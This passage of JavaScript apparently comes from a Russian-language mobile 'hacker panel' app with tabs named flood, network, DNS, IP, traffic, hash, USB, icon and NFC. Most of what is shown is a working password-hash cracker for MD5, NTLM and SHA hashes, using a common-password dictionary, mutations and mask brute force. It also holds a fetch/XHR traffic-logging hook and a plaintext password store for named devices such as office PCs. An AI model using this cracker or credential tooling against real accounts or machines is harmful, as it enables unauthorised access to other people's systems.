            d.forEach(x => { const c = $('div'); c.style.cssText = CARD; c.append($('div', null, x.query || '?'), $('div', null, [x.country, x.city, x.isp, x.org, x.as, x.proxy ? 'PROXY' : '', x.hosting ? 'HOSTING' : ''].filter(Boolean).join(' · '))); out.append(c); });
          } catch (e) { log('ip-api: ' + e.message, 'bad'); }
          await wait(1200);
        }
        store('ips', store('ips').concat(ips).slice(-500));
      }), out);
    };

    const traffic = (window.__wdTr = window.__wdTr || []);
    if (!window.__wdHooked) {
      window.__wdHooked = true;
      const of = window.fetch;
      window.fetch = function (inp, init) {
        const u = typeof inp === 'string' ? inp : inp?.url || '?', t0 = Date.now();
        const push = s => { traffic.push({ t: new Date().toISOString(), m: init?.method || 'GET', u, s, ms: Date.now() - t0 }); if (traffic.length > 500) traffic.shift(); };
        return of.apply(this, arguments).then(r => { push(r.status); return r; }, e => { push(0); throw e; });
      };
      const op = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function (m, u) {
        this.addEventListener('loadend', () => { traffic.push({ t: new Date().toISOString(), m, u: String(u), s: this.status, ms: 0 }); if (traffic.length > 500) traffic.shift(); });
        return op.apply(this, arguments);
      };
    }
    const tabTraffic = () => {
      const out = $('div');
      const draw = () => {
        out.innerHTML = ''; const l = traffic.slice(-60).reverse();
        if (!l.length) return out.append($('div', null, 'пусто'));
        l.forEach(e => { const c = $('div'); c.style.cssText = CARD; c.append($('div', null, e.m + ' ' + e.s + ' ' + e.ms + 'ms'), $('div', null, e.u.slice(0, 160))); out.append(c); });
      };
      const r = row('display:flex;gap:6px;margin-bottom:8px');
      r.append(button('ОБНОВИТЬ', draw), button('ЭКСПОРТ', () => save('morfy-traffic-' + Date.now() + '.json', { log: { entries: traffic } })));
      body.append(r, out); draw();
    };

    const tabHash = () => {
      const h = $('input'); h.placeholder = 'хеш'; h.style.cssText = IN + ';width:100%';
      const sel = $('select'); ['MD5', 'NTLM', 'SHA-1', 'SHA-256', 'SHA-512'].forEach(a => { const o = $('option', null, a); o.value = a; sel.append(o); }); sel.style.cssText = NARROW;
      const ta = $('textarea'); ta.placeholder = 'свой словарь, через пробел/перенос'; ta.style.cssText = IN + ';width:100%;min-height:60px';
      ta.value = '123456 qwerty password admin morfy 12345678 letmein 111111 iloveyou 000000';
      const cs = $('select'); [['0123456789', 'цифры'], ['0123456789abcdef', 'hex'], ['abcdefghijklmnopqrstuvwxyz', 'az'], ['abc123', 'abc123'], ['0123456789abcdefghijklmnopqrstuvwxyz', 'всё']].forEach(([v, n]) => { const o = $('option', null, n); o.value = v; cs.append(o); }); cs.style.cssText = NARROW;
      const from = $('input'); from.value = '4'; from.style.cssText = NARROW;
      const to = $('input'); to.value = '6'; to.style.cssText = NARROW;
      const mut = $('input'); mut.type = 'checkbox'; mut.checked = true;
      const info = $('div'); info.style.cssText = 'font-size:11px;color:#ffd166;margin-bottom:6px';
      let busy = null;
      const count = () => {
        const A = cs.value.length, a = +from.value, b = Math.min(+to.value, 10);
        if (!A || !a || b < a) return 0;
        let s = 0; for (let l = a; l <= b; l++) s += A ** l;
        return s;
      };
      const upd = () => {
        const n = count();
        info.textContent = n ? 'маска: ' + n.toLocaleString('ru') + ' кандидатов' + (n > 5e6 ? ' — это надолго' : '') : '';
      };
      [cs, from, to].forEach(i => i.addEventListener('change', upd)); upd();
      const run = async (gen, label) => {
        if (busy) return log('уже идёт', 'bad');
        const target = h.value.trim().toLowerCase();
        if (target.length !== HLEN[sel.value]) return log('хеш должен быть ' + HLEN[sel.value] + ' hex-символов для ' + sel.value, 'bad');
        if (!/^[0-9a-f]+$/.test(target)) return log('в хеше не hex', 'bad');
        busy = { stop: false };
        const t0 = Date.now(); let n = 0;
        for (const w of gen) {
          if (busy.stop) { busy = null; return log('остановлено на ' + n, 'bad'); }
          if (await digest(sel.value, w) === target) { busy = null; return log('НАЙДЕНО: ' + w + ' за ' + (Date.now() - t0) + 'мс', 'ok'); }
          if (++n % 400 === 0) { log(label + ' ' + n + '…', 'dim'); await wait(0); }
        }
        busy = null;
        log(label + ': не найдено (' + n + ')', 'bad');
      };
      const words = function* () {
        for (const w of ta.value.split(/[\s,;]+/).filter(Boolean)) {
          yield w;
          if (mut.checked) for (const m of mutate(w)) if (m !== w) yield m;
        }
      };
      const brute = function* () {
        const A = cs.value, a = +from.value, b = Math.min(+to.value, 10);
        for (let len = a; len <= b; len++) {
          const idx = new Array(len).fill(0);
          while (true) {
            yield idx.map(i => A[i]).join('');
            let p = len - 1;
            while (p >= 0 && ++idx[p] === A.length) { idx[p] = 0; p--; }
            if (p < 0) break;
          }
        }
      };
      const r1 = row(); r1.append(h, sel);
      const r2 = row(); r2.append($('span', null, 'маска:'), cs, from, to, $('span', null, 'мутации'), mut);
      const r3 = row(); r3.append(button('СЛОВАРЬ', () => run(words(), 'словарь')), button('БРУТ', () => run(brute(), 'брут')), button('СТОП', () => { if (busy) busy.stop = true; }));
      body.append(r1, ta, r2, info, r3);
    };

    const tabUsb = () => {
      const box = $('div');
      const draw = () => {
        box.innerHTML = ''; const l = store('usb');
        if (!l.length) return box.append($('div', null, 'нет устройств'));
        l.forEach((d, i) => {
          const c = $('div'); c.style.cssText = CARD;
          c.append($('div', null, d.name + (d.vid ? ' [' + d.vid + ':' + d.pid + ']' : '')));
          arr(d.pass).forEach((p, pi) => {
            const r = row('display:flex;gap:6px;align-items:center;margin-top:4px');
            r.append($('span', null, '• ' + '*'.repeat(Math.min(p.length, 12))),
              button('ВВЕСТИ', () => clip(p)),
              button('ПОКАЗАТЬ', () => log(d.name + ' → ' + p, 'ok')),
              button('×', () => { const x = store('usb'); x[i].pass = arr(x[i].pass); x[i].pass.splice(pi, 1); store('usb', x); draw(); }));
            c.append(r);
          });
          arr(d.hashes).forEach(hh => c.append($('div', null, '#' + hh.slice(0, 24) + '…')));
          const r = row('display:flex;gap:6px;margin-top:6px;flex-wrap:wrap');
          const pIn = $('input'); pIn.placeholder = 'пароль'; pIn.style.cssText = IN;
          const hIn = $('input'); hIn.placeholder = 'хеш'; hIn.style.cssText = IN;
          r.append(pIn, button('+пароль', () => { if (!pIn.value) return; const x = store('usb'); x[i].pass = arr(x[i].pass); x[i].pass.unshift(pIn.value); store('usb', x); pIn.value = ''; draw(); }),
            hIn, button('+хеш', () => { if (!hIn.value) return; const x = store('usb'); x[i].hashes = arr(x[i].hashes); x[i].hashes.unshift(hIn.value); store('usb', x); hIn.value = ''; draw(); }),
            button('УДАЛИТЬ', () => { const x = store('usb'); x.splice(i, 1); store('usb', x); draw(); }));
          c.append(r); box.append(c);
        });
      };
      const nm = $('input'); nm.placeholder = 'имя устройства (ПК в офисе)'; nm.style.cssText = IN;
      const imp = $('textarea'); imp.placeholder = 'импорт: имя;логин;пароль — по строке'; imp.style.cssText = IN + ';width:100%;min-height:50px';
      const r1 = row();
      r1.append(nm, button('ЗАПОМНИТЬ', () => {
        if (!nm.value) return log('введи имя', 'bad');
        const l = store('usb'); l.unshift({ name: nm.value, vid: '', pid: '', pass: [], hashes: [], at: new Date().toISOString() });
        store('usb', l); nm.value = ''; log('запомнено', 'ok'); draw();
      }));
      body.append(r1, imp, button('ИМПОРТ', () => {
        const l = store('usb'); let n = 0;
        imp.value.split('\n').forEach(line => {
          const [name, , pass] = line.split(';');
          if (!name || !name.trim()) return;
          let dev = l.find(x => x.name === name.trim());
          if (!dev) { dev = { name: name.trim(), vid: '', pid: '', pass: [], hashes: [], at: new Date().toISOString() }; l.unshift(dev); }
          if (pass && pass.trim()) { dev.pass = arr(dev.pass); dev.pass.push(pass.trim()); n++; }
        });
        store('usb', l); imp.value = ''; log('импортировано ' + n, 'ok'); draw();
      }), box, $('div', null, 'Пароли хранятся в памяти устройства. USB-модуль не подключён — ввод через буфер обмена.'));
      draw();
    };

    const ICONS = [
      ['Launcher', 'неон', '#14ff9a', '#04120B'],
      ['Blood', 'кровь', '#ff4054', '#14040A'],
      ['Ice', 'лёд', '#60d6ff', '#040E16'],
      ['Amethyst', 'аметист', '#ba78ff', '#0E0618'],
      ['Sunset', 'закат', '#ff9640', '#160A04'],
      ['Mono', 'моно', '#ebebeb', '#0C0C0C'],
      ['Ghost', 'призрак', '#8c96a0', '#0A0C0E']
    ];
    const tabIcon = () => {
      const cur = localStorage.getItem('wd.icon') || 'Launcher';
      const grid = $('div'); grid.style.cssText = 'display:grid;grid-template-columns:repeat(auto-fill,minmax(96px,1fr));gap:8px;margin-bottom:8px';
      const draw = () => {
        grid.innerHTML = '';
        ICONS.forEach(([id, name, ring, bg]) => {
          const c = $('div');
          c.style.cssText = 'display:flex;flex-direction:column;align-items:center;gap:6px;padding:8px;border-radius:10px;cursor:pointer;border:1px solid ' + (cur === id ? ring : '#14ff9a22');
          const pv = $('div');
          pv.style.cssText = 'width:52px;height:52px;border-radius:14px;display:flex;align-items:center;justify-content:center;background:' + bg + ';box-shadow:inset 0 0 0 2px ' + ring + '55';
          const gl = $('div');
          gl.style.cssText = 'width:22px;height:22px;border-radius:50%;border:2px solid ' + ring + ';box-shadow:0 0 10px ' + ring + '88';
          pv.append(gl);
          c.append(pv, $('div', null, name));
          c.onclick = async () => {
            const p = AIC();
            if (!p) return log('AppIcon-модуль не собран в этой версии', 'bad');
            const disable = ICONS.map(i => 'Icon' + i[0]).filter(n => n !== 'Icon' + id);
            try { await p.change({ name: 'Icon' + id, disable, suppressNotification: true }); localStorage.setItem('wd.icon', id); log('иконка: ' + name, 'ok'); draw(); }
            catch (e) { log('не сменилось: ' + e.message, 'bad'); }
          };
          grid.append(c);
        });
      };
      draw();
      body.append(grid, $('div', null, 'Лаунчер подхватывает за 1–3 секунды, в шторке остаётся прежняя. «Неон» — дефолт.'));
    };

    const T = [['ФЛУД', tabFlood], ['СЕТЬ', tabNet], ['DNS', tabDns], ['IP', tabIp], ['ТРАФИК', tabTraffic], ['ХЕШ', tabHash], ['USB', tabUsb], ['ИКОНКА', tabIcon], ['NFC', tabNfc]];
    T.forEach(([n, fn]) => bar.append(button(n, () => { body.innerHTML = ''; fn(); })));
    tabFlood();
  }
};
